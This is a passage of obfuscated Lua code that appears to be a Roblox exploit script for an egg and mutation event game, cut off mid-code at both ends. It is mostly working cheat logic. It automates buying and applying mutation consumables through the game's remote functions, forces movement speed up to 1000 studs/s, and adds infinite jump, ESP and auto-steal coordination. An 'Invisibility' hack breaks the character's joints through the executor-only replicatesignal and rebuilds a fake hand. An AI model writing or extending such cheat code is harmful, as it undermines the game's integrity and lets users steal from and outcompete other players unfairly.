						for _, v25 in v21, v22, v23 do
							if type(v25) == "table" and v25.Id == "MutationConsumable" then
								v24 = v25
							end
						end

						if v24 then
							local num = tonumber(v24.PurchaseLimit)

							if not (num and fn38(v20, v24) >= num) then
								local huge = tonumber(v24.Price) or math.huge

								if (tonumber(v20.Samples) or 0) - huge < tbl30.Keep then
									short = true

									if n23 == 0 then
										tbl37.Status = "Need " .. tostring(math.floor(huge)) .. " Samples"
									end

									break
								else
									local Shop = fn12("Shop", v24.Id, { Quote = v24.Quote, Sequence = tonumber(v20.ShopSequence) or 0 })

									if not (type(Shop) ~= "table" or Shop.Ok ~= true) then
										n23 += 1
										task.wait(0.4)
										continue
									end
								end
							end
						end
					end

					break
				end

				if n23 > 0 then
					tbl37.Status = string.format("Bought %d Scrambled", n23)
					tbl37.Short = short
					return true
				end

				tbl37.Short = short
				return false
			end

			local function fn60()
				local pen = 0
				local match = 0
				local n23 = -1
				local v20 = nil

				for _, v21 in ipairs(fn54()) do
					pen += 1
					local skipMutated = tbl37.SkipMutated and fn53(v21)
					local flag6 = false

					if skipMutated then
						flag6 = true
					end

					local flag7 = not flag6

					if flag7 then
						local minRarity = tbl37.MinRarity
						flag7 = fn51(v21) < minRarity
					end

					if flag7 then
						flag6 = true
					end

					local flag8 = not flag6 and tbl37.MinIncome > 0

					if flag8 then
						local minIncome = tbl37.MinIncome
						flag8 = fn52(v21) < minIncome
					end

					if flag8 then
						flag6 = true
					end

					if not flag6 and next(tbl37.Targets) ~= nil and tbl37.Targets[tostring(v21.AssetCategory)] ~= true then
						flag6 = true
					end

					if not flag6 then
						match += 1
						local n24

						if tbl37.Priority == tbl36[2] then
							n24 = fn51(v21) * 1000 + (tonumber(v21.AssetScale) or 0)
						elseif tbl37.Priority == tbl36[3] then
							n24 = tonumber(v21.AssetScale) or 0
						else
							n24 = fn52(v21)
						end

						local flag9 = n24 > n23

						if not flag9 and v20 ~= nil and n24 == n23 and v21.Uid == tbl37.Locked then
							n23 = n24
							v20 = v21
						elseif flag9 then
							n23 = n24
							v20 = v21
						end
					end
				end

				local v21 = tbl37
				tbl37.Pen = pen
				v21.Match = match
				return v20
			end

			local function fn61(arg)
				if typeof(arg) ~= "Color3" then
					return "#FFFFFF"
				end
				local floor = math.floor
				local n23 = arg.B * 255 + 0.5
				return string.format("#%02X%02X%02X", math.floor(arg.R * 255 + 0.5), math.floor(arg.G * 255 + 0.5), floor(n23))
			end

			local function fn62(arg)
				local ok, result = pcall(Color3.fromHex, arg)
				if not ok or typeof(result) ~= "Color3" then
					return arg
				end
				local v20, v21, v22 = result:ToHSV()
				return fn61(Color3.fromHSV(v20, math.min(v21, 0.78), math.max(v22, 0.82)))
			end

			local function fn63(arg)
				local v20 = fn50(arg and arg.AssetCategory)
				local icon = type(v20) == "table" and v20.Icon or nil
				if icon == nil then
					return ""
				end

				if tonumber(icon) then
					return "rbxassetid://" .. tostring(icon)
				end
				return tostring(icon)
			end

			local function fn64(arg)
				local v20 = fn50(arg and arg.AssetCategory)
				local rarity = type(v20) == "table" and v20.Rarity or nil
				local flag6 = type(rarity) == "table"

				if flag6 then
					flag6 = tostring(rarity.DisplayName or rarity._id or "")
				end

				return flag6 or "", fn62(fn61(type(rarity) == "table" and rarity.Color or nil))
			end

			local function fn65(arg)
				if type(arg) ~= "table" then
					return "No egg selected"
				end
				local v20 = fn50(arg.AssetCategory)
				local flag6 = type(v20) == "table"

				if flag6 then
					flag6 = tostring(v20.DisplayName or arg.AssetCategory)
				end

				return flag6 or tostring(arg.AssetCategory)
			end

			local function fn66()
				local idle = tbl38[tbl37.State] or tbl38.idle

				if tbl37.Ui.Accent and type(tbl37.Ui.Accent.Set) == "function" then
					tbl37.Ui.Accent.Set({ Background = idle })
				end

				if tbl37.Ui.Title and type(tbl37.Ui.Title.Set) == "function" then
					tbl37.Ui.Title.Set({ Text = tbl37.Status, Color = idle })
				end

				if tbl37.Ui.Egg and type(tbl37.Ui.Egg.Set) == "function" then
					tbl37.Ui.Egg.Set({ Text = tbl37.Detail, Color = tbl37.RarityColor })
				end

				if tbl37.Ui.Meta and type(tbl37.Ui.Meta.Set) == "function" then
					tbl37.Ui.Meta.Set({
						Text = string.format("Charges %d  Eggs %d/%d  Tries %d  Applied %d", tbl37.Left, tbl37.Match, tbl37.Pen, tbl37.Tries, tbl37.Hits),
					})
				end

				if tbl37.Ui.Icon and type(tbl37.Ui.Icon.Set) == "function" then
					tbl37.Ui.Icon.Set({ Visible = tbl37.Icon ~= "", Image = tbl37.Icon, StrokeColor = tbl37.RarityColor })
				end

				if tbl37.Row and type(tbl37.Row.Set) == "function" then
					pcall(tbl37.Row.Set, tbl37.Row, tbl37.Status .. "  -  " .. tbl37.Detail)
				end
			end

			local function fn67(arg)
				if type(arg) ~= "table" then
					tbl37.Detail = "No egg matches the filters"
					tbl37.RarityColor = "#C7CBD6"
					tbl37.Icon = ""
					return
				end

				local v20, v21 = fn64(arg)
				local n23 = tonumber(arg.AssetScale) or 0
				tbl37.Detail = string.format("%s   %.2f kg", fn65(arg), n23)

				if v20 ~= "" then
					tbl37.Detail = tbl37.Detail .. "   " .. string.upper(v20)
				end

				tbl37.RarityColor = v21
				tbl37.Icon = fn63(arg)
			end

			tbl37.Apply = function(arg, arg2)
				if not tbl37.Grip(arg2) then
					tbl37.State = "work"
					tbl37.Status = "Could not hold Scrambled"
					tbl37.Cooldown = os.clock() + 2
					return false
				end

				local packages = ReplicatedStorage:FindFirstChild("Packages")
				packages = packages and packages:FindFirstChild("Networking")
				local rfBossMasteryAskUseMutationConsu = packages and packages:FindFirstChild("RF/BossMastery/AskUseMutationConsumable")

				if not rfBossMasteryAskUseMutationConsu or not rfBossMasteryAskUseMutationConsu:IsA("RemoteFunction") then
					tbl37.State = "stop"
					tbl37.Status = "Mutation remote is missing"
					tbl37.Cooldown = os.clock() + 10
					return false
				end

				tbl37.State = "work"
				tbl37.Status = "Applying Scrambled"
				tbl37.Tries = tbl37.Tries + 1

				local ok, result = pcall(function()
					return rfBossMasteryAskUseMutationConsu:InvokeServer(arg.Uid)
				end)

				if not ok or type(result) ~= "table" then
					tbl37.Cooldown = os.clock() + 10
					return false
				end

				if result.Success == true then
					tbl37.Status = "Scrambled applied"
					tbl37.Locked = nil
					tbl37.State = "good"
					tbl37.Hits = tbl37.Hits + 1
					return true
				end

				local str4 = tostring(result.Message or "")
				local v20 = string.lower(str4)
				tbl37.Status = str4 ~= "" and str4 or "Try failed"
				tbl37.State = "work"

				if string.find(v20, "not found") or string.find(v20, "invalid") then
					tbl37.Locked = nil
					tbl37.Cooldown = os.clock() + 3
					return false
				end

				return true
			end

			tbl37.Settle = function()
				local n23 = os.clock() + 3

				while os.clock() < n23 do
					if tbl4.Grounded() then
						return
					end
					RunService.Heartbeat:Wait()
				end
			end

			tbl37.Over = function(arg)
				if arg ~= tbl37.Loop or not tbl4.Toggle(tbl37.Handle, false) then
					return true
				end

				if tbl4.Movement.PlaceWanted == true then
					return true
				end
				return tbl4.Movement.ScrambleWanted == true or tbl4.Steal.Wanted == true
			end

			tbl37.Idle = function(status, detail, arg)
				tbl37.State = "idle"
				tbl37.Status = status
				tbl37.Left = 0
				tbl37.Detail = detail
				tbl37.RarityColor = "#C7CBD6"
				tbl37.Icon = ""
				tbl37.Cooldown = os.clock() + (arg or 5)
			end

			local function fn68(arg)
				if tbl4.Movement.ScrambleWanted == true or tbl4.Steal.Wanted == true then
					tbl37.State = "work"
					tbl37.Status = tbl4.Movement.ScrambleWanted == true and "Drone hunt goes first" or "Auto Steal goes first"
					tbl37.Cooldown = os.clock() + 2
					return
				end

				local cooldown = tbl37.Cooldown
				if os.clock() < cooldown then
					return
				end
				local v20, v21 = fn58()

				if not v20 then
					pcall(fn60)
					if fn59() then
						tbl37.Cooldown = os.clock() + 0.5
						return
					end

					if tbl37.Short then
						tbl37.Idle("Out of Samples, waiting for more", "Hunt drones to earn Samples", 10)
						return
					end

					if not string.find(tbl37.Status, "Samples", 1, true) then
						tbl37.Status = "Need a Scrambled consumable"
					end

					tbl37.Idle(tbl37.Status, "Buy Scrambled from the event shop", 5)
					return
				end

				tbl37.Left = v21
				local v22 = fn60()

				if not v22 or not v22.Uid then
					tbl37.State = "stop"
					tbl37.Status = "Waiting"
					fn67(nil)
					return
				end

				if tbl4.Movement.PlaceWanted == true then
					tbl37.State = "work"
					tbl37.Status = "Auto Place goes first"
					tbl37.Cooldown = os.clock() + 2
					return
				end

				if not tbl4.ClaimMovement("mutation") then
					tbl37.State = "work"
					tbl37.Status = "Waiting for " .. tostring(tbl4.Movement.Owner or "movement")
					tbl37.Cooldown = os.clock() + 2
					return
				end

				tbl4.Movement.MutationWanted = true

				local ok, result = pcall(function()
					while not tbl37.Over(arg) do
						local v23, v24 = fn58()

						if v23 then
							tbl37.Left = v24
							local v25 = fn60()

							if not v25 or not v25.Uid then
								tbl37.State = "stop"
								tbl37.Status = "Waiting"
								fn67(nil)
								break
							else
								if v25.Uid ~= tbl37.Locked then
									tbl37.Locked = v25.Uid
									tbl37.Status = "New target picked"
								end

								fn67(v25)

								if not fn56(v25, arg) then
									tbl37.State = "work"
									tbl37.Status = "Could not reach the egg"
									tbl37.Cooldown = os.clock() + 3
									break
								elseif not tbl37.Over(arg) then
									if tbl37.Apply(v25, v23) then
										pcall(fn66)
										task.wait(0.35)
										continue
									end
								end
							end
						end

						break
					end
				end)

				if not ok then
					tbl37.Status = "Stopped: " .. tostring(result)
					tbl37.State = "work"
					tbl37.Cooldown = os.clock() + 3
				end

				tbl37.Settle()
				tbl4.Movement.MutationWanted = false
				tbl4.ReleaseMovement("mutation")
			end

			tbl37.Handle = v7:CreateToggle({
				Name = "Auto Use Scrambled Mutation",
				Default = false,
				Callback = function(arg)
					tbl37.Loop = tbl37.Loop + 1
					tbl4.Movement.MutationWanted = false
					tbl4.ReleaseMovement("mutation")
					if arg ~= true then
						return
					end
					local loop = tbl37.Loop

					task.spawn(function()
						while loop == tbl37.Loop and tbl4.Toggle(tbl37.Handle, false) do
							pcall(fn68, loop)
							pcall(fn66)
							task.wait(tbl37.State == "idle" and 3 or 1)
						end
					end)
				end,
			})

			if type(v7.CreateCanvas) == "function" then
				local v20 = v7:CreateCanvas({
					Name = "Scrambled Status",
					ShowTitle = false,
					Layout = "free",
					SubOf = tbl37.Handle,
					Style = {
						TextScale = 1,
						LineHeight = 1.1,
						MinLines = 4,
						MaxLines = 4,
						AutoHeight = true,
						BackgroundTransparency = 0.35,
						TextColor = Color3.fromRGB(255, 255, 255),
						TextStrokeTransparency = 0.7,
					},
					Build = function(arg)
						tbl37.Ui.Card = arg:Frame({
							X = 0,
							Y = 0,
							Width = 1,
							Height = 3.6,
							Corner = 0.3,
							Background = "#151821",
							BackgroundTransparency = 0.25,
						})

						tbl37.Ui.Accent = arg:Frame({
							Parent = tbl37.Ui.Card,
							X = 0.08,
							Y = 0.18,
							Width = 0.16,
							Height = 3.24,
							Corner = 0.2,
							Background = tbl38.idle,
						})

						tbl37.Ui.Icon = arg:Image({
							Parent = tbl37.Ui.Card,
							X = 0.42,
							Y = 0.3,
							Width = 3,
							Height = 3,
							Corner = 0.3,
							Background = "#242938",
							BackgroundTransparency = 0.1,
							StrokeThickness = 0.06,
							StrokeTransparency = 0,
							Visible = false,
						})

						tbl37.Ui.Title = arg:Text({
							Parent = tbl37.Ui.Card,
							X = 3.7,
							Y = 0.32,
							Width = 1,
							Height = 1.05,
							Scale = 1.16,
							Wrap = false,
							Text = tbl37.Status,
							Color = tbl38.idle,
							TextStrokeTransparency = 1,
						})

						tbl37.Ui.Egg = arg:Text({
							Parent = tbl37.Ui.Card,
							X = 3.7,
							Y = 1.42,
							Width = 1,
							Height = 1,
							Scale = 1,
							Wrap = false,
							Text = tbl37.Detail,
							Color = "#FFFFFF",
							TextStrokeTransparency = 1,
						})

						tbl37.Ui.Meta = arg:Text({
							Parent = tbl37.Ui.Card,
							X = 3.7,
							Y = 2.42,
							Width = 1,
							Height = 0.9,
							Scale = 0.86,
							Wrap = false,
							Text = "Charges 0  Eggs 0/0  Tries 0  Applied 0",
							Color = "#AEB4C6",
							TextStrokeTransparency = 1,
						})

						fn66()
					end,
				})

				fn4(function()
					pcall(function()
						v20:Destroy()
					end)
				end)
			else
				tbl37.Row = v7:CreateText({ Name = "Scrambled Status", Text = "Idle", SubOf = tbl37.Handle })
			end
		end

		v7:CreateDropdown({
			Name = "Mutation Min Rarity",
			Note = "Only eggs of this rarity and above are used",
			Options = tbl13,
			Default = tbl13[1],
			SubOf = tbl37.Handle,
			Callback = function(arg)
				tbl37.MinRarity = tbl14[arg] or 0
			end,
		})

		do
			local tbl38 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local tbl39 = { Slider = nil, Value = 0, Unit = "M/s" }

			local function fn50(arg, arg2)
				if arg ~= nil then
					tbl39.Value = math.max(0, math.floor(tonumber(arg) or tbl39.Value))
				end

				if arg2 ~= nil then
					tbl39.Unit = tostring(arg2)
				end

				tbl37.MinIncome = tbl39.Value * (tbl38[tbl39.Unit] or tbl38["M/s"]).Mult
			end

			tbl39.Slider = fn5(v7, {
				Name = "Min Mutation Value",
				Note = "Skip eggs worth less than this (0 = off)",
				SubOf = tbl37.Handle,
				Legacy = "Mutation Min Value",
				SectionName = "Dr Scramble Event",
				OnRaw = function(arg)
					fn50(math.floor(arg / 1000), "K/s")
				end,
			})
		end

		v7:CreateDropdown({
			Name = "Mutation Priority",
			Note = "Which egg gets the consumable first",
			Options = tbl36,
			Default = tbl36[1],
			SubOf = tbl37.Handle,
			Callback = function(arg)
				tbl37.Priority = tostring(arg)
			end,
		})

		fn6(v7:CreateMultiDropdown({
			Name = "Mutation Target Eggs",
			Note = "Only use the consumable on these eggs (empty = all)",
			Options = tbl37.EggOptions,
			Default = {},
			SubOf = tbl37.Handle,
			Callback = function(arg)
				local targets = {}

				if type(arg) == "table" then
					for k, v19 in pairs(arg) do
						k = v19 == true and type(k) == "string" and k

						if k then
							v19 = k
						else
							v19 = type(v19) == "string" and v19
						end

						v19 = v19 or nil

						if v19 and tbl37.EggCategory[v19] then
							targets[tbl37.EggCategory[v19]] = true
						end
					end
				end

				tbl37.Targets = targets
			end,
		}))

		tbl37.BuyHandle = v7:CreateToggle({
			Name = "Auto Buy Scrambled",
			Note = "Buy another Scrambled from the event shop when you run out",
			Default = false,
			SubOf = tbl37.Handle,
			Callback = function()
				tbl37.Cooldown = 0
			end,
		})

		fn4(function()
			tbl37.Loop = tbl37.Loop + 1
			tbl4.Movement.MutationWanted = false
			tbl4.ReleaseMovement("mutation")
		end)

		do
			local n22 = nil
			local flag6 = false
			local flag7 = false

			tbl3.Add(function()
				if not flag7 and os.clock() - n10 >= n7 then
					flag7 = true

					task.spawn(function()
						pcall(fn14, true)
						flag7 = false
					end)
				end

				local flag8 = nil

				if v16 then
					flag8 = type(v16.Set) == "function"
				end

				if flag8 then
					pcall(v16.Set, nil, fn20())
				end

				local flag9 = nil

				if v18 then
					flag9 = type(v18.Set) == "function"
				end

				if flag9 then
					pcall(v18.Set, nil, fn45())
				end

				local v19 = fn17()
				local v20 = tbl4.IsNight()

				if v19 and not flag6 then
					tbl33.Latch = v20
					tbl33.Ended = false
				end

				if not v20 then
					tbl33.Latch = false
				elseif v19 and not tbl33.Latch and not tbl33.Ended then
					tbl33.Ended = true
					str2 = "Night arrived, this outbreak is over"
					table.clear(tbl28)
					table.clear(tbl29)
				end

				if not v19 then
					tbl33.Ended = false
				end

				if flag6 and not v19 then
					task.delay(15, function()
						if not fn17() then
							table.clear(tbl28)
							table.clear(tbl35)
						end
					end)
				end

				flag6 = v19

				if tbl4.Toggle(tbl30.Handle, false) and not flag5 and os.clock() >= n14 and fn16() then
					flag5 = true
					n14 = os.clock() + 8

					task.spawn(function()
						pcall(fn39, function()
							return not tbl4.Toggle(tbl30.Handle, false)
						end)

						flag5 = false
					end)
				end

				local v21 = fn46()
				local v22 = fn47()
				tbl4.Movement.ScrambleWanted = v21 or v22
				local invisibilityHandle = tbl4.InvisibilityHandle
				local flag10 = invisibilityHandle ~= nil and tbl4.Toggle(invisibilityHandle, false)

				if v21 then
					n22 = nil

					if not tbl4.InvisSuspended then
						tbl4.InvisSuspended = true
						flag10 = flag10 and type(v.Notify) == "function"

						if flag10 then
							pcall(v.Notify, "Invisibility", "Invisibility is paused for the drone hunt and comes back after it.", 5)
						end
					end
				elseif tbl4.InvisSuspended and not flag3 then
					n22 = n22 or os.clock() + 5

					if n22 <= os.clock() then
						n22 = nil
						tbl4.InvisSuspended = false

						if flag10 and type(v.Notify) == "function" then
							pcall(v.Notify, "Invisibility", "The drone hunt is over, Invisibility is back on.", 5)
						end
					end
				end

				local character = localPlayer.Character
				if v21 and not flag3 and character and character:GetAttribute("InvisApplied") == true then
					str2 = "Leaving Invisibility for the hunt"
					return true
				end

				if flag3 then
					return v21
				end

				if not (v21 or v22) or os.clock() < n12 then
					if not v21 and not v22 then
						str2 = ""
					end

					return false
				end

				local steal = tbl4.Steal
				if steal.Active or steal.Carrying or steal.Wanted then
					str2 = "Auto Steal goes first"
					return v21
				end

				if not tbl4.ClaimMovement("scramble") then
					str2 = "Waiting for " .. tostring(tbl4.Movement.Owner or "movement") .. " to finish"
					return v21
				end
				flag3 = true
				n12 = os.clock() + n8
				local v23 = n11

				task.spawn(function()
					pcall(fn49, function()
						return v23 ~= n11
					end)

					tbl4.HoldBelt()
					pcall(fn48, v23)
					fn44()
					tbl4.ReleaseBelt()
					tbl4.ReleaseMovement("scramble")
					flag3 = false
					tbl3.Wake()
				end)

				return v21
			end)
		end

		fn4(function()
			n11 += 1
			fn44()
			tbl4.InvisSuspended = false
			tbl4.Movement.ScrambleWanted = false
			tbl4.ReleaseMovement("scramble")
		end)

		do
			local v19 = v2:CreateTab({ Name = "Player", SectionsExpanded = true })
			tbl4.EspSection = v19:CreateSection({ Name = "ESP", Expanded = false })
			local v20 = v19:CreateSection({ Name = "Movement", Expanded = true })
			v14 = v19:CreateSection({ Name = "Character", Expanded = true })
			v15 = v19:CreateSection({ Name = "Combat", Expanded = true })
			local createToggle = nil
			local n22 = 350
			local connection2 = nil
			local flag6 = false

			local function fn50()
				local character = localPlayer.Character
				local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
				character = character and character:FindFirstChildOfClass("Humanoid")
				if humanoidRootPart and character and character.Health > 0 then
					return humanoidRootPart, character
				end
				return nil, nil
			end

			local function fn51()
				if not flag6 then
					return
				end
				flag6 = false
				local v21, v22 = fn50()
				if not v21 then
					return
				end
				local assemblyLinearVelocity = v21.AssemblyLinearVelocity
				local moveDirection = v22.MoveDirection
				local vector2 = Vector3.new(moveDirection.X, 0, moveDirection.Z)
				local vector3 = vector2.Magnitude > 0.001 and vector2.Unit * v22.WalkSpeed or Vector3.zero

				pcall(function()
					v21.AssemblyLinearVelocity = Vector3.new(vector3.X, assemblyLinearVelocity.Y, vector3.Z)
				end)
			end

			local function fn52()
				if connection2 then
					connection2:Disconnect()
					connection2 = nil
				end

				fn51()
				tbl4.Shield("speed", false)
			end

			local function fn53()
				if connection2 then
					return
				end
				tbl4.Shield("speed", true)

				connection2 = RunService.Heartbeat:Connect(function()
					if tbl4.Steal.Active or tbl4.Flying or tbl4.Driving > 0 or tbl4.Treadmill.Riding then
						flag6 = false
						return
					end
					local v21, v22 = fn50()
					if not v21 or v22.Sit or v22.PlatformStand then
						flag6 = false
						return
					end
					local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
					if num and num > workspace:GetServerTimeNow() then
						flag6 = false
						return
					end
					local moveDirection = v22.MoveDirection
					local vector2 = Vector3.new(moveDirection.X, 0, moveDirection.Z)
					if vector2.Magnitude <= 0.001 then
						fn51()
						return
					end
					local n23 = vector2.Unit * n22
					local assemblyLinearVelocity = v21.AssemblyLinearVelocity

					pcall(function()
						v21.AssemblyLinearVelocity = Vector3.new(n23.X, assemblyLinearVelocity.Y, n23.Z)
					end)

					flag6 = true
				end)
			end

			tbl4.SpeedForced = false

			local function fn54()
				if tbl4.Toggle(createToggle, false) or tbl4.SpeedForced then
					fn53()
				else
					fn52()
				end
			end

			local flag7 = false
			local flag8 = false
			local flag9 = false

			tbl4.SetSpeedForced = function(arg)
				tbl4.SpeedForced = arg == true
				flag7 = true
				fn54()
			end

			local tbl38 = {
				Name = "Speed Boost",
				Default = false,
				Callback = function()
					if tbl4.SpeedForced and not tbl4.Toggle(createToggle, false) then
						flag7 = true
						flag9 = true
					end

					fn54()
				end,
			}

			createToggle = v20.CreateToggle
			createToggle = createToggle(v20, tbl38)

			local connection3 = RunService.Heartbeat:Connect(function()
				if flag9 then
					flag9 = false

					if type(v.Notify) == "function" then
						pcall(v.Notify, "Speed Boost", "Speed Boost must stay on while Invisibility is on.", 5)
					end
				end

				if not flag7 then
					return
				end
				flag7 = false
				local flag10

				if tbl4.SpeedForced and not tbl4.Toggle(createToggle, false) then
					flag8 = true
					flag10 = true
				else
					local flag11 = not tbl4.SpeedForced and flag8
					flag10 = nil

					if flag11 then
						flag8 = false
						local v21 = nil

						if tbl4.Toggle(createToggle, false) then
							flag10 = false
						else
							flag10 = v21
						end
					end
				end

				if flag10 ~= nil then
					for _, v21 in ipairs({ "Set", "SetValue" }) do
						local ok, result = pcall(function()
							return createToggle[v21]
						end)

						if not (ok and type(result) == "function" and pcall(result, createToggle, flag10)) then
							continue
						end
						break
					end
				end
			end)

			fn4(function()
				connection3:Disconnect()
			end)

			v20:CreateSlider({
				Name = "Boost Speed",
				Min = 20,
				Max = 1000,
				Default = 350,
				Increment = 5,
				Unit = "studs/s",
				Callback = function(arg)
					n22 = math.clamp(tonumber(arg) or 350, 20, 1000)
				end,
			})

			fn4(fn52)
			local v21 = nil
			local connection4 = nil

			local function fn55()
				if connection4 then
					connection4:Disconnect()
					connection4 = nil
				end

				tbl4.Shield("jump", false)
			end

			v21 = v20:CreateToggle({
				Name = "Infinite Jump",
				Default = false,
				Callback = function()
					if not tbl4.Toggle(v21, false) then
						fn55()
						return
					end

					if connection4 then
						return
					end
					tbl4.Shield("jump", true)

					connection4 = UserInputService.JumpRequest:Connect(function()
						local character = localPlayer.Character
						local humanoid = character and character:FindFirstChildOfClass("Humanoid")

						if humanoid then
							pcall(function()
								humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
							end)
						end
					end)
				end,
			})

			fn4(fn55)
		end
	end

	do
		local v16 = nil
		local flag3 = false
		local flag4 = true
		local flag5 = false
		local flag6 = false
		local flag7 = false
		local v17 = nil
		local v18 = nil
		local hipHeight = 999

		local function fn11()
			return flag3 and not tbl4.InvisSuspended and not tbl4.InvisMech
		end

		local function fn12(arg)
			return arg and arg:FindFirstChildOfClass("Humanoid") or nil
		end

		local function fn13(arg)
			return networking:FindFirstChild(arg)
		end

		local function fn14(arg)
			return arg ~= nil and arg:GetAttribute("InvisApplied") == true
		end

		local function fn15()
			local AskDoff = fn13("RF/Treadmill/AskDoff")

			if AskDoff and AskDoff:IsA("RemoteFunction") then
				for i = 1, 2 do
					pcall(AskDoff.InvokeServer, AskDoff)
				end
			end
		end

		local function fn16(arg)
			local AskRigWipe = fn13("RE/RigSync/AskRigWipe")

			if AskRigWipe and AskRigWipe:IsA("RemoteEvent") then
				pcall(AskRigWipe.FireServer, AskRigWipe, arg)
			end
		end

		local function fn17(arg)
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")

			for _, child in ipairs(arg:GetChildren()) do
				if child:IsA("Humanoid") then
					pcall(child.UnequipTools, child)
				end
			end

			if backpack then
				for _, child in ipairs(arg:GetChildren()) do
					if child:IsA("Tool") then
						pcall(function()
							child.Parent = backpack
						end)
					end
				end
			end

			for i = 1, 3 do
				RunService.Heartbeat:Wait()
			end
		end

		local function fn18(arg)
			local v19 = fn12(arg)
			if not arg or not v19 then
				return false
			end
			fn17(arg)
			fn15()

			pcall(function()
				v19:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
				v19.BreakJointsOnDeath = true
				v19.RequiresNeck = true
				v19.Health = 0
			end)

			pcall(function()
				v19:ChangeState(Enum.HumanoidStateType.Dead)
			end)

			pcall(function()
				arg:BreakJoints()
			end)

			fn16(arg)
			return true
		end

		local function fn19(parent)
			local v19 = fn12(parent)
			local n7 = os.clock() + 10

			while true do
				if os.clock() < n7 and flag4 and parent.Parent then
					v19 = v19 or fn12(parent)
					if not (v19 and parent:FindFirstChild("HumanoidRootPart") and parent:FindFirstChild("Head")) then
						task.wait()
						continue
					end
				end

				break
			end

			local humanoidRootPart = parent:FindFirstChild("HumanoidRootPart")
			if not fn11() or not v19 or not humanoidRootPart or not parent:FindFirstChild("Head") then
				return false
			end
			task.wait(0.05)
			if not fn11() or parent.Parent == nil then
				return false
			end

			for i = 1, 2 do
				pcall(v19.UnequipTools, v19)
			end

			if type(replicatesignal) == "function" then
				for i = 1, 2 do
					pcall(replicatesignal, v19.ServerBreakJoints)
				end
			end

			local hipHeight2 = v19.HipHeight

			pcall(function()
				v19.HipHeight = hipHeight
			end)

			for _, child in ipairs(parent:GetChildren()) do
				if child:IsA("Accessory") or child:IsA("BasePart") and child ~= humanoidRootPart then
					pcall(function()
						child.Parent = nil
					end)
				end
			end

			task.wait(0.12)

			local function fn20()
				pcall(function()
					v19.HipHeight = hipHeight2
				end)

				for _, child in ipairs(parent:GetChildren()) do
					if child:IsA("Humanoid") and child.HipHeight ~= hipHeight2 then
						pcall(function()
							child.HipHeight = hipHeight2
						end)
					end
				end
			end

			if parent.Parent == nil then
				fn20()
				return false
			end
			local motor6D = Instance.new("Motor6D")
			motor6D.Name = "RightWrist"
			motor6D.C0 = CFrame.new(1.2, 0, 0)
			motor6D.C1 = CFrame.new()
			motor6D.Part0 = humanoidRootPart
			motor6D.Parent = humanoidRootPart
			local part = Instance.new("Part")
			part.Name = "RightHand"
			part.Size = Vector3.new(0.2, 0.2, 0.2)
			part.Transparency = 1
			part.CanCollide = false
			part.CanTouch = false
			part.CanQuery = false
			part.Massless = true
			part.CFrame = humanoidRootPart.CFrame * motor6D.C0
			motor6D.Part1 = part
			part.Parent = parent

			pcall(function()
				humanoidRootPart.CanCollide = false
			end)

			fn20()
			parent:SetAttribute("InvisApplied", true)

			task.delay(1, function()
				local chilliToolKeeper = (typeof(getgenv) == "function" and getgenv() or _G).ChilliToolKeeper

				if parent.Parent and type(chilliToolKeeper) == "function" then
					pcall(chilliToolKeeper)
				end
			end)

			task.delay(0.2, function()
				if humanoidRootPart.Parent then
					pcall(function()
						humanoidRootPart.CanCollide = true
					end)
				end
			end)

			local connection = parent.ChildAdded:Connect(function(child)
				if child:IsA("Humanoid") then
					task.defer(function()
						if child.HipHeight ~= hipHeight2 then
							pcall(function()
								child.HipHeight = hipHeight2
							end)
						end
					end)
				end
			end)

			local connection2 = nil

			connection2 = parent.AncestryChanged:Connect(function(child, parent2)
				if parent2 == nil then
					connection:Disconnect()
					connection2:Disconnect()
				end
			end)

			return true
		end

		local function fn20()
			local active = tbl4.Steal.Active or tbl4.Steal.Carrying or tbl4.Flying

			if not active then
				active = (tbl4.Driving or 0) > 0
			end

			return active
		end

		tbl4.RequestRespawn = function()
			flag7 = true
		end

		local function fn21()
			flag5 = true
			local v19 = flag7

			while flag4 and (fn20() or not tbl4.ClaimMovement("invisibility")) do
				task.wait(0.2)
			end

			local character = localPlayer.Character

			if flag4 and character and (v19 or fn14(character) ~= fn11()) and fn12(character) then
				flag7 = false
				tbl12.Paused = true
				tbl4.ShieldPaused = true
				pcall(tbl4.UndoSwap)
				task.wait()
				fn18(localPlayer.Character)
				local n7 = os.clock() + 60
				local n8 = os.clock() + 8

				while flag4 and os.clock() < n7 and localPlayer.Character == character do
					if n8 <= os.clock() then
						n8 = os.clock() + 8
						fn16(character)
					end

					task.wait(0.05)
				end

				task.wait(0.1)

				while flag4 and flag6 do
					task.wait(0.05)
				end
			end

			tbl12.Paused = false
			tbl4.ShieldPaused = false
			tbl4.ReleaseMovement("invisibility")
			flag5 = false
		end

		local connection = localPlayer.CharacterAdded:Connect(function(character)
			if not fn11() then
				return
			end
			flag6 = true
			tbl4.ShieldPaused = true

			task.spawn(function()
				pcall(fn19, character)
				flag6 = false

				if not flag5 then
					tbl4.ShieldPaused = false
				end
			end)
		end)

		local thread = task.spawn(function()
			while flag4 do
				local character = localPlayer.Character
				local v19 = fn12(character)

				if not flag5 and not flag6 and character and v19 and v19.Health > 0 and (flag7 or fn14(character) ~= fn11()) then
					fn21()
				end

				local v20 = fn14(localPlayer.Character)

				if v20 ~= v17 then
					v17 = v20
					tbl4.SetSpeedForced(v20)
				end

				task.wait(0.25)
			end
		end)

		local connection2 = RunService.Heartbeat:Connect(function()
			local character = localPlayer.Character
			if not character or not fn14(character) then
				return
			end
			local rightHand = character:FindFirstChild("RightHand")
			local tool = character:FindFirstChildWhichIsA("Tool")
			local handle = tool and tool:FindFirstChild("Handle")
			if not rightHand or not handle or not handle:IsA("BasePart") then
				return
			end
			local cframe = CFrame.new()

			for _, child in ipairs(rightHand:GetChildren()) do
				if child:IsA("JointInstance") and child.Name == "RightGrip" and child.Part1 == handle then
					cframe = child.C0 * child.C1:Inverse()

					if child.Enabled then
						child.Enabled = false
					end
				end
			end

			pcall(function()
				handle.CFrame = rightHand.CFrame * cframe
				handle.AssemblyLinearVelocity = Vector3.zero
				handle.AssemblyAngularVelocity = Vector3.zero
			end)
		end)

		fn4(function()
			connection2:Disconnect()
		end)

		local connection3 = RunService.Heartbeat:Connect(function()
			local character = localPlayer.Character
			local v19 = fn12(character)
